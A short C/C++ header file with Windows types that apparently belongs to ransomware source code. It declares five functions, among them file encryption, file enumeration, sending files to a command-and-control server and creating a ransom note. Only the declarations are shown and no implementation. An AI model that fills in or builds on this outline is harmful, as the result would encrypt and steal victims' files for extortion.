#pragma once
#include "common.h"

BOOL StartFileEncryption();
BOOL EnumerateFiles(LPCWSTR root_path);
BOOL SendFileToC2(LPCWSTR file_path);
BOOL CreateRansomNote();
void Cleanup();
